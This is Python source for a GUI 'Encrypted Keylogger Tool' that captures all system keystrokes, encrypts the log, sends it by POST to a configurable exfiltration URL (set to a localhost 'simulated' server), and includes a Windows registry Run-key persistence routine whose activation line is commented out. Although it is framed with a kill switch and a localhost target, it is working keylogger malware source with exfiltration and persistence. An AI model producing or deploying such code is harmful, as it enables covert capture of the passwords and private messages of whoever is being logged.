import threading
import tkinter as tk
from tkinter import filedialog, messagebox
from pynput import keyboard
from cryptography.fernet import Fernet
import base64
import time
import datetime
import requests
import os
import sys
import json

KEY_FILE = "keylogger_key.key"
LOG_FILE = "encrypted_keylog.log"
EXFILTRATION_URL = "http://localhost:5000/upload"  # Simulated remote server


class EncryptedKeyloggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Encrypted Keylogger Tool")
        self.root.geometry("450x280")
        self.root.resizable(False, False)

        self.font = ("Segoe UI", 12)
        self.key_font = ("Segoe UI", 20, "bold")

        self.is_listening = False
        self.log = []
        self.listener = None

        # Load or generate encryption key
        self.key = self.load_or_create_key()
        self.cipher = Fernet(self.key)

        # Kill switch: detect triple ESC press within 2 seconds to stop & clear
        self.esc_press_timestamps = []

        self.create_widgets()

    def create_widgets(self):
        header = tk.Label(
            self.root,
            text="Encrypted Keylogger Tool",
            font=("Segoe UI", 18, "bold"),
            pady=10,
        )
        header.pack()

        self.key_display = tk.Label(
            self.root,
            text="Press Start to begin logging...",
            font=self.key_font,
            fg="#059669",
            pady=20,
            wraplength=420,
            justify="center",
        )
        self.key_display.pack()

        buttons_frame = tk.Frame(self.root)
        buttons_frame.pack(pady=10)

        self.start_button = tk.Button(
            buttons_frame,
            text="Start",
            font=self.font,
            width=10,
            bg="#10b981",
            fg="white",
            activebackground="#059669",
            activeforeground="white",
            command=self.start_keylogger,
            relief="raised",
            bd=3,
        )
        self.start_button.grid(row=0, column=0, padx=8)

        self.stop_button = tk.Button(
            buttons_frame,
            text="Stop",
            font=self.font,
            width=10,
            bg="#ef4444",
            fg="white",
            activebackground="#b91c1c",
            activeforeground="white",
            command=self.stop_keylogger,
            state="disabled",
            relief="raised",
            bd=3,
        )
        self.stop_button.grid(row=0, column=1, padx=8)

        self.save_button = tk.Button(
            self.root,
            text="Save Encrypted Log",
            font=self.font,
            width=22,
            bg="#3b82f6",
            fg="white",
            activebackground="#2563eb",
            activeforeground="white",
            command=self.save_log,
            state="disabled",
            relief="raised",
            bd=3,
        )
        self.save_button.pack(pady=6)

        self.exfiltrate_button = tk.Button(
            self.root,
            text="Exfiltrate (Send Log)",
            font=self.font,
            width=22,
            bg="#8b5cf6",
            fg="white",
            activebackground="#6d28d9",
            activeforeground="white",
            command=self.exfiltrate_log,
            state="disabled",
            relief="raised",
            bd=3,
        )
        self.exfiltrate_button.pack(pady=6)

        self.status_label = tk.Label(
            self.root,
            text="Status: Idle",
            font=("Segoe UI", 10),
            fg="#444444",
            pady=10,
        )
        self.status_label.pack()

    def load_or_create_key(self):
        if os.path.isfile(KEY_FILE):
            try:
                with open(KEY_FILE, "rb") as kf:
                    key = kf.read()
                # Validate key length
                if len(key) == 44:
                    return key
            except Exception:
                pass
        # Generate new key and save
        key = Fernet.generate_key()
        try:
            with open(KEY_FILE, "wb") as kf:
                kf.write(key)
        except Exception as e:
            messagebox.showwarning("Warning", f"Could not save encryption key file: {e}")
        return key

    def on_press(self, key):
        try:
            key_str = key.char if hasattr(key, "char") and key.char else str(key)
        except Exception:
            key_str = str(key)

        key_str_clean = key_str.replace("'", "")

        # Append timestamped entry
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        entry = f"[{timestamp}] {key_str_clean}"
        self.log.append(entry)

        # Kill switch: track ESC key presses (key == keyboard.Key.esc)
        if key == keyboard.Key.esc:
            now = time.time()
            self.esc_press_timestamps = [t for t in self.esc_press_timestamps if now - t < 2.0]
            self.esc_press_timestamps.append(now)
            if len(self.esc_press_timestamps) >= 3:
                # Kill switch activated
                self.stop_keylogger()
                self.log.clear()
                self.key_display.after(
                    0,
                    lambda: self.key_display.config(
                        text="Kill switch activated! Logging stopped and data cleared."
                    ),
                )
                self.status_label.after(0, lambda: self.status_label.config(text="Status: Killed by kill switch"))
                return

        # Update key display in main thread
        self.key_display.after(
            0, lambda: self.key_display.config(text=f"Last Key Pressed: {key_str_clean}")
        )

    def start_keylogger(self):
        if self.is_listening:
            return
        self.log = []
        self.is_listening = True
        self.start_button.config(state="disabled")
        self.stop_button.config(state="normal")
        self.save_button.config(state="disabled")
        self.exfiltrate_button.config(state="disabled")
        self.key_display.config(text="Keylogger running... (Press ESC 3 times quickly to kill)")

        self.status_label.config(text="Status: Listening...")

        # Start listener in a background thread
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()

    def stop_keylogger(self):
        if not self.is_listening:
            return
        self.is_listening = False
        if self.listener:
            self.listener.stop()
            self.listener = None
        self.start_button.config(state="normal")
        self.stop_button.config(state="disabled")
        self.save_button.config(state="normal" if self.log else "disabled")
        self.exfiltrate_button.config(state="normal" if self.log else "disabled")
        self.key_display.config(text="Keylogger stopped. You can save or exfiltrate the encrypted log.")
        self.status_label.config(text="Status: Stopped")

    def save_log(self):
        if not self.log:
            messagebox.showwarning("No Data", "No keys to save. Please start logging first.")
            return

        file_path = filedialog.asksaveasfilename(
            defaultextension=".log",
            filetypes=[("Log files", "*.log"), ("All files", "*.*")],
            title="Save Encrypted Key Log",
        )
        if not file_path:
            return

        try:
            # Join entries separated by newlines and encrypt
            joined_log = "\n".join(self.log).encode("utf-8")
            encrypted_data = self.cipher.encrypt(joined_log)

            with open(file_path, "wb") as f:
                f.write(encrypted_data)

            self.status_label.config(text=f"Status: Encrypted log saved to {os.path.basename(file_path)}")
            messagebox.showinfo("Saved", f"Encrypted log saved to:\n{file_path}")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save encrypted log:\n{e}")

    def exfiltrate_log(self):
        if not self.log:
            messagebox.showwarning("No Data", "No keys to send. Please start logging first.")
            return

        self.status_label.config(text="Status: Sending encrypted log to server...")
        self.root.update_idletasks()

        try:
            joined_log = "\n".join(self.log).encode("utf-8")
            encrypted_data = self.cipher.encrypt(joined_log)
            # Base64 encode to send as JSON safely
            encoded_data = base64.b64encode(encrypted_data).decode("utf-8")

            # JSON payload
            payload = {"timestamp": datetime.datetime.now().isoformat(), "log": encoded_data}

            # Send POST request to localhost server
            response = requests.post(EXFILTRATION_URL, json=payload, timeout=5)

            if response.status_code == 200:
                self.status_label.config(text="Status: Log successfully sent to server (localhost).")
                messagebox.showinfo("Success", "Encrypted log sent successfully to the server.")
            else:
                self.status_label.config(text=f"Status: Server error - {response.status_code}")
                messagebox.showerror("Server Error", f"Failed to send log: {response.status_code}")
        except requests.exceptions.RequestException as e:
            self.status_label.config(text="Status: Failed to connect to server.")
            messagebox.showerror("Connection Error", f"Could not send log to server:\n{e}")
        except Exception as e:
            self.status_label.config(text="Status: Unexpected error during exfiltration.")
            messagebox.showerror("Error", f"Error during sending log:\n{e}")

    # Simple Windows-only startup persistence example (commented out for safety)
    def add_startup_persistence(self):
        """
        Add this script to Windows startup for persistence.
        Only works on Windows.
        Use with caution. Uncomment in main if desired.
        """
        if sys.platform != "win32":
            return
        try:
            import winreg
            exe_path = os.path.abspath(sys.argv[0])
            run_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, run_key, 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, "EncryptedKeyloggerTool", 0, winreg.REG_SZ, f'"{exe_path}"')
            print("Startup persistence added.")
        except Exception as e:
            print(f"Failed to add startup persistence: {e}")

    # To remove persistence, user needs to delete the registry key manually


def main():
    # Uncomment lines below to enable startup persistence on Windows
    # app.add_startup_persistence()

    root = tk.Tk()
    app = EncryptedKeyloggerApp(root)
    root.mainloop()


if __name__ == "__main__":
    main()


